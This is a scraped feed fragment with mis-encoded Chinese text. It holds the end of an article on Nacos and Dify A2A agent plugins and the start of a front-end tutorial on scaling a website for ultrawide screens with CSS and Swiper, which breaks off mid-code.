<p><strong>ç»Ÿä¸€æ³¨å†Œå‘ç°</strong></p>
<p>æ‰€æœ‰ A2A Agent é›†ä¸­æ³¨å†Œåˆ° Nacosï¼Œå¼€å‘è€…æ— éœ€å…³å¿ƒæ™ºèƒ½ä½“çš„å…·ä½“éƒ¨ç½²ä½ç½®ã€‚æ–°å¢æ™ºèƒ½ä½“æ—¶åªéœ€æ³¨å†Œåˆ° Nacosï¼ŒDify åº”ç”¨å³å¯è‡ªåŠ¨å‘ç°å¹¶è°ƒç”¨ï¼Œæ”¯æŒåŠ¨æ€ä¸Šä¸‹çº¿ã€‚</p>
<p><strong>å¤šç§Ÿæˆ·éš”ç¦»</strong></p>
<p>åŸºäº Nacos çš„å‘½åç©ºé—´éš”ç¦»æœºåˆ¶ï¼Œå¯ä»¥å°†ä¸åŒç¯å¢ƒï¼ˆå¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ï¼‰æˆ–ä¸åŒä¸šåŠ¡çº¿çš„æ™ºèƒ½ä½“å®Œå…¨éš”ç¦»ï¼Œäº’ä¸å½±å“ï¼Œæ»¡è¶³ä¼ä¸šçº§å¤šç§Ÿæˆ·åœºæ™¯ã€‚</p>
<p><strong>å¥åº·æ£€æŸ¥</strong></p>
<p>Nacos è‡ªåŠ¨ç›‘æ§å„æ™ºèƒ½ä½“çš„è¿è¡ŒçŠ¶æ€ï¼Œå½“æŸä¸ª Agent ä¸å¯ç”¨æ—¶è‡ªåŠ¨ä»æœåŠ¡åˆ—è¡¨ä¸­æ‘˜é™¤ï¼Œé¿å…è°ƒç”¨å¤±è´¥ï¼Œæ¢å¤åè‡ªåŠ¨é‡æ–°ä¸Šçº¿ã€‚</p>
<p><strong>å…ƒä¿¡æ¯ç®¡ç†</strong></p>
<p>æ”¯æŒåœ¨è¿è¡Œæ—¶åŠ¨æ€æ›´æ–°æ™ºèƒ½ä½“çš„æè¿°ã€æŠ€èƒ½åˆ—è¡¨ç­‰å…ƒä¿¡æ¯ï¼Œæ— éœ€é‡å¯æœåŠ¡ã€‚è¿™å¯¹äºæ™ºèƒ½ä½“èƒ½åŠ›è¿­ä»£å‡çº§éå¸¸å‹å¥½ã€‚</p>
<p><strong>è®¿é—®æ§åˆ¶</strong></p>
<p>é€šè¿‡ Nacos çš„è®¤è¯é‰´æƒæœºåˆ¶ï¼Œå¯ä»¥ç²¾ç»†æ§åˆ¶å“ªäº›åº”ç”¨å¯ä»¥è®¿é—®å“ªäº›æ™ºèƒ½ä½“ï¼Œä¿éšœä¼ä¸šçº§åº”ç”¨çš„å®‰å…¨æ€§ã€‚</p>
<p><strong>ç”Ÿæ€é›†æˆ</strong></p>
<p>Nacos Agent Registry ä¸ä»…æ”¯æŒ A2A åè®®ï¼Œè¿˜ä¸é˜¿é‡Œäº‘ AI ç½‘å…³ã€AgentScope ç­‰ç»„ä»¶æ— ç¼å¯¹æ¥ï¼Œæ„å»ºå®Œæ•´çš„æ™ºèƒ½ä½“æ²»ç†ç”Ÿæ€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c888cea429344938b2bcc2da01db1e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=PNVsGh9d3Cf1XgZr1o8BN7xLZ24%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-31">æ€»ç»“ä¸å±•æœ›</h2>
<p><strong>A2A æ’ä»¶ç»„åˆå¡«è¡¥äº† Dify å¹³å°åœ¨ A2A åè®®æ”¯æŒä¸Šçš„ç©ºç™½</strong>ï¼Œä¸º Dify å¼€å‘è€…å¸¦æ¥äº†åŒå‘å¤šæ™ºèƒ½ä½“åä½œèƒ½åŠ›ï¼š</p>
<ul>
<li><strong>åŒå‘åè®®æ”¯æŒï¼š</strong> A2A Discovery è°ƒç”¨å¤–éƒ¨æ™ºèƒ½ä½“ï¼ŒA2A Server æš´éœ² Dify åº”ç”¨ï¼Œå®ç°å®Œæ•´çš„ A2A ç”Ÿæ€äº’é€šã€‚</li>
<li><strong>ç®€åŒ–æ¥å…¥ï¼š</strong> é€šè¿‡ Nacos Agent Registryï¼Œä¸€æ¬¡é…ç½®å³å¯å‘ç°æ‰€æœ‰æ™ºèƒ½ä½“ï¼Œä¹Ÿå¯è®© Dify åº”ç”¨è¢«è‡ªåŠ¨å‘ç°ã€‚</li>
<li><strong>æ™ºèƒ½é€‰æ‹©ï¼š</strong> LLM æ ¹æ®ä»»åŠ¡éœ€æ±‚åŠ¨æ€é€‰æ‹©æœ€åˆé€‚çš„æ™ºèƒ½ä½“ã€‚</li>
<li><strong>æ ‡å‡†åè®®ï¼š</strong> å®Œå…¨éµå¾ª Google A2A åè®®ï¼Œä¸å„ç±»å®ç°æ— ç¼å…¼å®¹ã€‚</li>
<li><strong>ç”Ÿæ€äº’é€šï¼š</strong> ä¸ AgentScope ç­‰ä¸»æµæ™ºèƒ½ä½“æ¡†æ¶æ·±åº¦é›†æˆï¼ŒDify åº”ç”¨å¯è¢«å…¶ä»– AI å¹³å°å‘ç°å’Œè°ƒç”¨ã€‚</li>
<li><strong>ä¼ä¸šçº§æ²»ç†ï¼š</strong> ä¾æ‰˜ Nacos å¹³å°ï¼Œäº«å—å®Œæ•´çš„æ™ºèƒ½ä½“ç®¡ç†èƒ½åŠ›ã€‚</li>
</ul>
<p>éšç€ AI å¤šæ™ºèƒ½ä½“æŠ€æœ¯çš„æŒç»­æ¼”è¿›ï¼ŒNacos å°†ç»§ç»­æ·±è€• AI Agent ç”Ÿæ€ï¼Œä» MCP Server ç®¡ç†åˆ° A2A Agent åä½œï¼Œä¸ AgentScope ç­‰ä¸»æµæ™ºèƒ½ä½“æ¡†æ¶æ·±åº¦é›†æˆï¼Œä¸ºå¼€å‘è€…æä¾›æ›´åŠ å®Œå–„çš„æ™ºèƒ½ä½“æ²»ç†å¹³å°ã€‚é€šè¿‡ A2A Discovery å’Œ A2A Server æ’ä»¶çš„ç»„åˆï¼ŒDify å¼€å‘è€…ç°åœ¨å¯ä»¥æ„å»ºçœŸæ­£å¼€æ”¾äº’è”çš„æ™ºèƒ½ä½“åº”ç”¨â€”â€”æ—¢èƒ½è°ƒç”¨ç”Ÿæ€ä¸­çš„å„ç±»ä¸“ä¸šæ™ºèƒ½ä½“ï¼Œä¹Ÿèƒ½å°†è‡ªå·±çš„æ™ºèƒ½ä½“èƒ½åŠ›å¼€æ”¾ç»™æ•´ä¸ª A2A ç”Ÿæ€ã€‚æœªæ¥ï¼Œæˆ‘ä»¬è¿˜å°†æ”¯æŒæ›´å¤šçš„æ™ºèƒ½ä½“åè®®å’Œæ›´ä¸°å¯Œçš„æ²»ç†èƒ½åŠ›ï¼ŒåŠ©åŠ›å¼€å‘è€…æ„å»ºæ›´åŠ å¼ºå¤§çš„ AI åº”ç”¨ã€‚</p>
<p><strong>ç›¸å…³é“¾æ¥ï¼š</strong></p>
<p>[1]Â AgentScope</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelscope%2Fagentscope" target="_blank" title="https://github.com/modelscope/agentscope" ref="nofollow noopener noreferrer">github.com/modelscope/â€¦</a></p>
<p>[2]Â AgentScope å®˜æ–¹æ–‡æ¡£</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelscope%2Fagentscope" target="_blank" title="https://github.com/modelscope/agentscope" ref="nofollow noopener noreferrer">github.com/modelscope/â€¦</a></p>
<p>[3]Â æ’ä»¶é¡µé¢</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fa2a_discovery%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/a2a_discovery?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nacâ€¦</a></p>
<p>[4]Â æ’ä»¶é¡µé¢</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fa2a_server%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/a2a_server?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nacâ€¦</a></p>
<p><strong>å‚è€ƒé“¾æ¥ï¼š</strong></p>
<p>[1]Â A2A æ’ä»¶æºä»£ç ï¼ˆGitHubï¼‰</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnacos-group%2Fnacos-dify-plugins" target="_blank" title="https://github.com/nacos-group/nacos-dify-plugins" ref="nofollow noopener noreferrer">github.com/nacos-groupâ€¦</a></p>
<p>[2]Â Nacos å®˜ç½‘</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fnacos.io%2F" target="_blank" title="https://nacos.io/" ref="nofollow noopener noreferrer">nacos.io/</a></p>
<p>[3]Â Nacos GitHub ä»“åº“</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos" target="_blank" title="https://github.com/alibaba/nacos" ref="nofollow noopener noreferrer">github.com/alibaba/nacâ€¦</a></p>
<p>[4]Â Google A2A åè®®</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle%2FA2A" target="_blank" title="https://github.com/google/A2A" ref="nofollow noopener noreferrer">github.com/google/A2A</a></p>
<p>[5]Â Dify å®˜ç½‘</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdify.ai%2F" target="_blank" title="https://dify.ai/" ref="nofollow noopener noreferrer">dify.ai/</a></p>
<p>[6]Â Nacos MCP æ’ä»¶</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fnacos_mcp%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/nacos_mcp?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nacâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¸¦é±¼å±é€‚é…ï¼Œæˆ‘ç”¨äº†æœ€ç¬¨çš„åŠæ³•]]></title>    <link>https://juejin.cn/post/7603054272158924850</link>    <guid>https://juejin.cn/post/7603054272158924850</guid>    <pubDate>2026-02-05T10:12:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603054272158924850" data-draft-id="7603054272158662706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¸¦é±¼å±é€‚é…ï¼Œæˆ‘ç”¨äº†æœ€ç¬¨çš„åŠæ³•"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-05T10:12:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="webxin666"/> <meta itemprop="url" content="https://juejin.cn/user/2573323143485608"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¸¦é±¼å±é€‚é…ï¼Œæˆ‘ç”¨äº†æœ€ç¬¨çš„åŠæ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2573323143485608/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    webxin666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:12:52.000Z" title="Thu Feb 05 2026 10:12:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¦æŠŠå®˜ç½‘é€‚é…å¸¦é±¼å±ã€‚è¯´å®è¯ä¸€å¼€å§‹æŒºå¤´ç–¼çš„ï¼Œ21:9 çš„å±å¹•å’Œå¸¸è§„ 16:9 å·®å¤ªå¤šäº†ï¼Œè®¾è®¡é‚£è¾¹ç»™çš„ç¨¿å­æ˜¯ 2500Ã—1080ï¼Œæ ¸å¿ƒå†…å®¹è¿˜æ˜¯ 1920Ã—1080ã€‚</p>
<p>ç½‘ä¸Šæœäº†ä¸€åœˆï¼Œæ–¹æ¡ˆäº”èŠ±å…«é—¨ï¼Œä»€ä¹ˆåª’ä½“æŸ¥è¯¢æ–­ç‚¹ã€rem é€‚é…ã€vw/vh æ–¹æ¡ˆ... è¯•äº†å‡ ä¸ªéƒ½ä¸å¤ªé¡ºæ‰‹ã€‚æœ€åç”¨äº†ä¸ªæœ€ç¬¨çš„åŠæ³• â€”â€” æ•´ä½“ scale ç¼©æ”¾ã€‚ç»è¿‡å®è·µæ•ˆæœè¿˜ä¸é”™ã€‚</p>
<p><code>è¶…å®½å±å¹• 2900Ã—1080 åˆ†è¾¨ç‡çš„æ˜¾ç¤ºæ•ˆæœï¼šé¡µé¢å±…ä¸­ä¸¤è¾¹ç•™ç™½</code> <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bc462bf505f4993a59525032a9fcad5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2VieGluNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891174&amp;x-signature=Wxl5gEb%2F1m27y%2BjnWZViwcSpWE8%3D" alt="image.png" width="70%" loading="lazy"/></p>
<p><code>å¸¸è§„å±å¹• 1920Ã—1080 åˆ†è¾¨ç‡çš„æ˜¾ç¤ºæ•ˆæœï¼šåªæ˜¾ç¤ºæ ¸å¿ƒå†…å®¹</code> <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6d6abf96a8d4ee8a16d4027441d3c8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2VieGluNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891174&amp;x-signature=GxrkOX6lwTy0vxV33LeD3Skul2k%3D" alt="image.png" width="70%" loading="lazy"/></p>
<p><code>è¾ƒçª„å±å¹• 900Ã—1080 åˆ†è¾¨ç‡çš„æ˜¾ç¤ºæ•ˆæœï¼šæ˜¾ç¤ºæ ¸å¿ƒå†…å®¹ï¼Œä¸Šä¸‹ç•™ç™½</code> <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7245f6932424ff7a524dfec2025925d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2VieGluNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891174&amp;x-signature=ksduuFb%2B4%2ByibuDIXMoaOUp%2Bhsc%3D" alt="image.png" width="70%" loading="lazy"/></p>
<p>å®é™…æ•ˆæœå‚è€ƒ<code>è‰è‰ä¸æ¸¸æˆ</code>çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fpm.lilith.com%2F" target="_blank" title="https://pm.lilith.com/" ref="nofollow noopener noreferrer"><code>ã€Šå¸•èŒæˆ˜æ–—æ—¥è®°ã€‹</code>å®˜ç½‘</a></p>
<h2 data-id="heading-0">å…ˆè¯´æ€è·¯</h2>
<p>ä¸¤å±‚å®¹å™¨åµŒå¥—ï¼š</p>
<ul>
<li>å¤–å±‚ 2500Ã—1080ï¼Œå¸¦é±¼å±ç”¨æˆ·èƒ½çœ‹åˆ°çš„æ‰©å±•åŒºåŸŸ</li>
<li>å†…å±‚ 1920Ã—1080ï¼Œæ ¸å¿ƒå†…å®¹åŒºï¼Œæ™®é€šå±å¹•ä¹Ÿèƒ½å®Œæ•´æ˜¾ç¤º</li>
</ul>
<p>ç„¶åæ ¹æ®è§†å£å¤§å°ï¼Œç®—ä¸€ä¸ªç¼©æ”¾æ¯”ä¾‹ï¼Œæ•´ä½“ scaleã€‚å°±è¿™ä¹ˆç®€å•ã€‚</p>
<h2 data-id="heading-1">æ ¸å¿ƒå°±ä¸€è¡Œ CSS</h2>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attr">--s</span>: <span class="hljs-built_in">min</span>(<span class="hljs-number">100vw</span> / <span class="hljs-number">1920px</span>, <span class="hljs-number">100vh</span> / <span class="hljs-number">1080px</span>);
</code></pre>
<p>å–å®½é«˜ç¼©æ”¾æ¯”çš„æœ€å°å€¼ï¼Œä¿è¯é¡µé¢ä¸ä¼šè¶…å‡ºå±å¹•è¾¹ç•Œã€‚</p>
<p>è¿™é‡Œç”¨äº† CSS çš„ <code>min()</code> å‡½æ•°ï¼Œç›´æ¥åœ¨æ ·å¼é‡Œç®—ã€‚çœå¾—å†™ JS ç›‘å¬ resize äº†ã€‚</p>
<h2 data-id="heading-2">å®¹å™¨ç»“æ„</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-id">#element_pc</span> (æ’‘æ»¡è§†å£ï¼Œ<span class="hljs-attribute">overflow</span>: hidden)
  â””â”€â”€ <span class="hljs-selector-id">#container_2500</span> (<span class="hljs-number">2500</span>Ã—<span class="hljs-number">1080</span>ï¼ŒåŠ  scale ç¼©æ”¾)
        â””â”€â”€ <span class="hljs-selector-class">.box_1920</span> (<span class="hljs-number">1920</span>Ã—<span class="hljs-number">1080</span>ï¼Œå±…ä¸­æ”¾æ ¸å¿ƒå†…å®¹)
</code></pre>
<h2 data-id="heading-3">å…·ä½“ä»£ç </h2>
<h3 data-id="heading-4">HTML ç»“æ„</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"element_pc"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"container_2500"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"swiper MySwiper"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- é¡¶éƒ¨å¯¼èˆªï¼Œfixed å®šä½ --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- Swiper å‚ç›´è½®æ’­ --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"swiper-wrapper"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"swiper-slide section1"</span>&gt;</span>
                <span class="hljs-comment">&lt;!-- 2500 åŒºåŸŸå¯ä»¥æ”¾å¸¦é±¼å±ä¸“å±çš„è£…é¥°å…ƒç´  --&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box_1920"</span>&gt;</span>
                    <span class="hljs-comment">&lt;!-- 1920 åŒºåŸŸæ”¾ä¸»è¦å†…å®¹ --&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"swiper-slide section2"</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-5">CSS æ ¸å¿ƒéƒ¨åˆ†</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-id">#element_pc</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">overflow</span>: hidden;
  
  <span class="hljs-comment">/* è®¾è®¡ç¨¿å°ºå¯¸ï¼Œæ”¹è¿™ä¿©å˜é‡å°±è¡Œ */</span>
  <span class="hljs-attr">--designW</span>: <span class="hljs-number">1920px</span>;
  <span class="hljs-attr">--designH</span>: <span class="hljs-number">1080px</span>;
  <span class="hljs-attr">--s</span>: <span class="hljs-built_in">min</span>(<span class="hljs-number">100vw</span> / <span class="hljs-built_in">var</span>(--designW), <span class="hljs-number">100vh</span> / <span class="hljs-built_in">var</span>(--designH));
}

<span class="hljs-selector-id">#container_2500</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">2500px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">1080px</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-comment">/* å…ˆå±…ä¸­ï¼Œå†ç¼©æ”¾ */</span>
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>) <span class="hljs-built_in">scale</span>(<span class="hljs-built_in">var</span>(--s));
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e7e7e7</span>;
}

<span class="hljs-selector-class">.box_1920</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-built_in">var</span>(--designW);
  <span class="hljs-attribute">height</span>: <span class="hljs-built_in">var</span>(--designH);
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>);
}
</code></pre>
<p>è®°å¾—åŠ ä¸Šæµè§ˆå™¨å‰ç¼€ï¼š</p>
<pre><code class="hljs language-css" lang="css">-webkit-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>) <span class="hljs-built_in">scale</span>(<span class="hljs-built_in">var</span>(--s));
-ms-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>) <span class="hljs-built_in">scale</span>(<span class="hljs-built_in">var</span>(--s));
</code></pre>
<h3 data-id="heading-6">JS éƒ¨åˆ†</h3>
<p>ç”¨äº† Swiper åšå‚ç›´è½®æ’­ï¼Œé…åˆå¯¼èˆªæ è”åŠ¨ã€‚è¿™å—æ²¡ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œå¸¸è§„æ“ä½œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> mySwiper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Swiper</span>(<span class="hljs-string">'.MySwiper'</span>, {
  <span class="hljs-attr">direction</span>: <span class="hljs-string">'vertical'</span>,
  <span class="hljs-attr">mousewheel</span>: { <span class="hljs-attr">forceToAxis</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">keyboard</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">on</span>: {
    <span class="hljs-attr">slideChange</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
